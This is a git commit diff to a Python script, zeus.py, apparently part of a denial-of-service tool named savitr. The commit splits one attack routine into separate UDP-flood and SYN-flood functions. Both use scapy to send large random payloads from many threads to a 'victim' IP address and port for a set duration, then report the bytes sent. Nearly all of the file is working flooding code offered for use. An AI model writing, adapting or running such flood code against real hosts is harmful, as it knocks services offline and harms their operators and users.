55de86373a7f9ec96d5819d5e1c6c53fd81ba452
Billy <xn4vys34lx@gmail.com>
2017-09-26 02:42:27 +0600

    Update zeus.py

--- savitr/zeus.py
+++ savitr/zeus.py
@@ -1,82 +1,92 @@
-from thirdparty.scapy.all import *
 import  time, random, string, threading
 
-#   TODO
-#   1. Update src code
-#   2. Add PoD (ping of death) method.
-#   3. Add default parameters if at least target is given.
+from sys import stdout
 
-#   Data placed outside of loop for performance...dont need to keep creating something that's constant.
+try:
+    from thirdparty.scapy.all import *
+except ImportError:
+    stdout.write("\n[!!]\tWas unable to import 'scapy.all' from directory 'thirdparty/scapy'")
+
+
 random_data = ''.join([random.choice(string.ascii_letters + string.digits)for x in range(65000)])
 
-async def strike(**kwargs):
-    'Threaded attack methods (UDP and SYN)'
-    #   attack function for UDP and SYN. Will probably re-write the entire src eventually
-    #   but for now it works just as intended.
-
+async def udp_strike(**kwargs):
+    'udp flood function'
 
     UDPTHREADPOOL = []
-    SYNTHREADPOOL = []
+    data_sent = 0
 
     end = time.time() + kwargs['time/Seconds']
 
     while time.time() < end:
 
-        time.sleep(.4)
+        time.sleep(kwargs['sleep'])
 
-        if kwargs['method/UDP,SYN'] == 'UDP'.casefold():
+        try:
 
-            try:
+            udp_packet = IP(dst=str(kwargs['victim/IP address']))/UDP(dport=int(kwargs['destination/Port']))/Raw(load=str(random_data))
+            UDPTHREADPOOL.clear()   #   Need to clear the threads so it doesn't infinitely stack.
 
-                udp_packet = IP(dst=str(kwargs['victim/IP address']))/UDP(dport=int(kwargs['destination/Port']))/Raw(load=str(random_data))
-                UDPTHREADPOOL.clear()   #   Need to clear the threads so it doesn't infinitely stack.
+            for x in range(kwargs['threads']):
 
-                for x in range(kwargs['threads']):
+                UDPTHREADPOOL.append(threading.Thread(target=send(verbose=False, x=udp_packet)))
 
-                    UDPTHREADPOOL.append(threading.Thread(target=send, args=udp_packet))
+            for y in range(len(UDPTHREADPOOL)):
 
-                for y in range(len(UDPTHREADPOOL)):
+                UDPTHREADPOOL[y].start()
+                UDPTHREADPOOL[y].join()
+                UDPTHREADPOOL[y]._stop()
 
-                    UDPTHREADPOOL[y].start()
-                    UDPTHREADPOOL[y].join()
-                    UDPTHREADPOOL[y]._stop()
+                data_sent += 65000
 
-            except (PermissionError or ThreadGenSource):
+        except (PermissionError or ThreadGenSource):
 
-                print ('\n[!!]\tMust run as root user or permission!\n[!!]\tCould not generate threads!')
-                raise SystemExit
-        #   TODO
-        #   Split this into a new function to avoid time elapsed from condition checking.
-        elif kwargs['method/UDP,SYN'] == 'SYN'.casefold():
+            print ('\n[!!]\tMust run as root user or permission!\n[!!]\tCould not generate threads!')
+            raise SystemExit
 
-            try:
-
-                tcp_packet = IP(dst=str(kwargs['victim/IP address']))/TCP(sport=RandShort(), dport=int(kwargs['destination/Port']), seq=123456, ack=74, window=None, flags='S')/Raw(load=str(random_data))
-
-                for x in range(kwargs['threads']):
-
-                    SYNTHREADPOOL.append(threading.Thread(target=send, args=tcp_packet))
-
-                for y in range(len(SYNTHREADPOOL)):
-
-                    SYNTHREADPOOL[y].start()
-                    SYNTHREADPOOL[y].join()
-                    SYNTHREADPOOL[y]._stop()
-
-            except (PermissionError or ThreadGenSource):
-
-                print ('\n[!!]\tMust run as root user or permission!\n[!!]\tCould not generate threads!')
-                raise SystemExit
-
-        else:
-
-            print("\n[!!]\tPlease enter a real method (-m udp / -m syn). -h for help!")
-
-    #   TODO
-    #   Add statistics such as time elapsed and data amount sent.
-    print ('\n[*]\tAttack finished successfully!')
-    raise SystemExit
+        stdout.write("\n[*]\tFinished successfully!\n"
+                 "[#]\tSummary: Sent {} Bytes to host {victim/IP address} on port {destination/Port} in {time/Seconds} second(s)\n".format(data_sent, **kwargs)); raise SystemExit
 
 
+
+
+
+async def syn_strike(**kwargs):
+    'syn flood function'
+
+    SYNTHREADPOOL = []
+    data_sent = 0
+
+    end = time.time() + kwargs['time/Seconds']
+
+    while time.time() < end:
+
+        time.sleep(kwargs['sleep'])
+
+
+        try:
+
+            tcp_packet = IP(dst=str(kwargs['victim/IP address']))/TCP(sport=RandShort(), dport=int(kwargs['destination/Port']), seq=123456, ack=74, window=None, flags='S')/Raw(load=str(random_data))
+            SYNTHREADPOOL.clear()   #   Need to clear the threads so it doesn't infinitely stack.
+
+            for x in range(kwargs['threads']):
+
+                SYNTHREADPOOL.append(threading.Thread(target=send(verbose=False, x=tcp_packet)))
+
+            for y in range(len(SYNTHREADPOOL)):
+
+                SYNTHREADPOOL[y].start()
+                SYNTHREADPOOL[y].join()
+                SYNTHREADPOOL[y]._stop()
+
+                data_sent += 65000
+
+        except (PermissionError or ThreadGenSource):
+
+            print ('\n[!!]\tMust run as root user or permission!\n[!!]\tCould not generate threads!')
+            raise SystemExit
+
+    stdout.write("\n[*]\tFinished successfully!\n"
+                 "[#]\tSummary: Sent {} Bytes to host {victim/IP address} on port {destination/Port} in {time/Seconds} second(s)\n".format(data_sent, **kwargs)); raise SystemExit
 
 
